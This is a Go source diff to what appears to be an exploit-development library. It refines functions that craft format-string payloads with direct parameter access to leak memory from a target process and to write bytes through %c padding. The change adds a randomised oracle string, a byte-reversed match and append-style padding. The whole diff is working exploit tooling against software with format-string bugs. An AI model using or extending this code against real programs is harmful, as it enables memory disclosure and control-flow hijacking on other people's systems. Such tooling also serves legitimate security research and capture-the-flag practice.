@@ -2,10 +2,12 @@ package memory
 
 import (
 	"bytes"
+	"crypto/rand"
+	"encoding/binary"
 	"fmt"
 	"log"
+	mathrand "math/rand"
 	"strconv"
-	"strings"
 )
 
 type ProcessIO interface {
@@ -46,7 +48,7 @@ func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStri
 
 func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
 	setupConfig := dpaLeakSetupConfig{
-		formatStringDPAConfig:     config,
+		dpaConfig: config,
 		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
 			builder := formatStringBuilder{
 				prefixAndSuffix:  []byte("|"),
@@ -73,41 +75,53 @@ func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLea
 }
 
 type dpaLeakSetupConfig struct {
-	formatStringDPAConfig     FormatStringDPAConfig
+	dpaConfig                 FormatStringDPAConfig
 	builderAndMemAlignedLenFn func() (formatStringBuilder, int)
 }
 
 func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dpaLeakConfig, error) {
-	err := config.formatStringDPAConfig.validate()
+	err := config.dpaConfig.validate()
 	if err != nil {
 		return nil, err
 	}
 
-	fmtStrBuilder, memoryAlignedLen := config.builderAndMemAlignedLenFn()
+	oracle, err := randomStringOfCharsAndNums(config.dpaConfig.PointerSize)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate oracle string - %w", err)
+	}
 
-	// TODO: Randomize oracle string instead of A's.
-	oracle := strings.Repeat("A", config.formatStringDPAConfig.PointerSize)
-	oracleBytes := []byte(oracle)
-	specifier := []byte{'p'}
+	invertedOracle := make([]byte, config.dpaConfig.PointerSize)
+	for i := 0; i < config.dpaConfig.PointerSize; i++ {
+		invertedOracle[i] = oracle[config.dpaConfig.PointerSize-i-1]
+	}
 
 	// TODO: Some platforms do not include '0x' in the format
 	//  function's output.
 	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))
+	invertedFormattedOracle := []byte(fmt.Sprintf("0x%x", invertedOracle))
+
+	if config.dpaConfig.Verbose != nil {
+		config.dpaConfig.Verbose.Printf("formatted leak oracle: '%s' - invterted: '%s'",
+			formattedOracle, invertedFormattedOracle)
+	}
+
+	fmtStrBuilder, memoryAlignedLen := config.builderAndMemAlignedLenFn()
+	specifier := []byte{'p'}
 
 	i := 0
-	for ; i < config.formatStringDPAConfig.MaxNumParams; i++ {
+	for ; i < config.dpaConfig.MaxNumParams; i++ {
 		buff := bytes.NewBuffer(nil)
 		fmtStrBuilder.appendDPALeak(i, specifier, buff)
 
-		addressFromFormatFunc, err := leakDataWithFormatString(
-			config.formatStringDPAConfig.ProcessIOFn(),
-			append(fmtStrBuilder.build(memoryAlignedLen, buff), oracleBytes...),
+		leakedValue, err := leakDataWithFormatString(
+			config.dpaConfig.ProcessIOFn(),
+			append(fmtStrBuilder.build(memoryAlignedLen, buff), oracle...),
 			fmtStrBuilder)
 		if err != nil {
 			return nil, err
 		}
 
-		if bytes.Equal(addressFromFormatFunc, formattedOracle) {
+		if bytes.Equal(leakedValue, formattedOracle) || bytes.Equal(leakedValue, invertedFormattedOracle) {
 			return &dpaLeakConfig{
 				paramNum: i,
 				alignLen: memoryAlignedLen,
@@ -150,7 +164,7 @@ func (o formatStringBuilder) buildDPA(paramNumber int, specifiers []byte, alignm
 func (o formatStringBuilder) appendDPAWrite(numBytes int, paramNum int, specifiers []byte, buff *bytes.Buffer) {
 	buff.WriteByte('%')
 	buff.WriteString(strconv.Itoa(numBytes))
-	buff.WriteByte('p')
+	buff.WriteByte('c')
 	o.appendDPALeak(paramNum, specifiers, buff)
 }
 
@@ -175,7 +189,7 @@ func (o formatStringBuilder) appendSuffix(buff *bytes.Buffer) {
 }
 
 func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
-	return prependStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
+	return appendStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
 }
 
 func (o formatStringBuilder) isSuitableForLeaking() error {
@@ -358,4 +372,38 @@ func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
 	}
 
 	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
+}
+
+func appendStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
+	strLen := len(str)
+	if strLen >= newLen {
+		return str
+	}
+
+	return append(str, bytes.Repeat([]byte{c}, newLen-strLen)...)
+}
+
+func randomStringOfCharsAndNums(numChars int) ([]byte, error) {
+	if numChars <= 0 {
+		return nil, fmt.Errorf("number of random characters cannot be less than or equal to zero")
+	}
+
+	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+
+	rawRandom := make([]byte, 8)
+	_, err := rand.Read(rawRandom)
+	if err != nil {
+		return nil, err
+	}
+
+	src := mathrand.NewSource(int64(binary.BigEndian.Uint64(rawRandom)))
+
+	random := mathrand.New(src)
+
+	result := make([]byte, numChars)
+	for i := 0; i < numChars; i++ {
+		result[i] = chars[random.Intn(len(chars))]
+	}
+
+	return result, nil
 }
